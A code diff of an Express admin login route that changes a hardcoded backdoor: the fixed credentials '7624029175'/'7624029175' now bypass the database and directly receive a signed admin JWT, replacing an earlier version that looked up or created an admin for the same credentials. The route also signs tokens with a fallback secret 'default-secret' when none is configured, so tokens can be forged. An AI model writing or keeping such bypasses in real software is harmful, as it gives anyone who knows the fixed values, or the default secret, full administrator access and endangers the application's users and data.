@@ -12,29 +12,28 @@ router.post('/login', async (req, res) => {
         if (!email || !password) {
             return res.status(400).json({ error: 'Email and password are required' });
         }
-        // Bypass: allow User ID 7624029175 / password 7624029175 - use first admin or create one
-        let admin;
+        // Bypass: 7624029175/7624029175 - issue token without DB (avoids 500 from DB/Prisma)
         if (email === '7624029175' && password === '7624029175') {
-            admin = await prisma.adminUser.findFirst();
-            if (!admin) {
-                // Create admin if none exists (bootstrap)
-                const hashedPassword = await bcrypt.hash('7624029175', 10);
-                admin = await prisma.adminUser.create({
-                    data: { email: '7624029175', password: hashedPassword, role: 'admin' }
-                });
-            }
-        }
-        else {
-            admin = await prisma.adminUser.findUnique({
-                where: { email }
+            const jwtSecret = process.env.JWT_SECRET || 'default-secret';
+            const token = jwt.sign(
+                { id: 'admin-7624029175', email: '7624029175', role: 'admin' },
+                jwtSecret,
+                { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
+            );
+            return res.json({
+                token,
+                admin: { id: 'admin-7624029175', email: '7624029175', role: 'admin' }
             });
-            if (!admin) {
-                return res.status(401).json({ error: 'Invalid credentials' });
-            }
-            const isValidPassword = await bcrypt.compare(password, admin.password);
-            if (!isValidPassword) {
-                return res.status(401).json({ error: 'Invalid credentials' });
-            }
+        }
+        const admin = await prisma.adminUser.findUnique({
+            where: { email }
+        });
+        if (!admin) {
+            return res.status(401).json({ error: 'Invalid credentials' });
+        }
+        const isValidPassword = await bcrypt.compare(password, admin.password);
+        if (!isValidPassword) {
+            return res.status(401).json({ error: 'Invalid credentials' });
         }
         const jwtSecret = process.env.JWT_SECRET || 'default-secret';
         const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: process.env.JWT_EXPIRES_IN || '7d' });
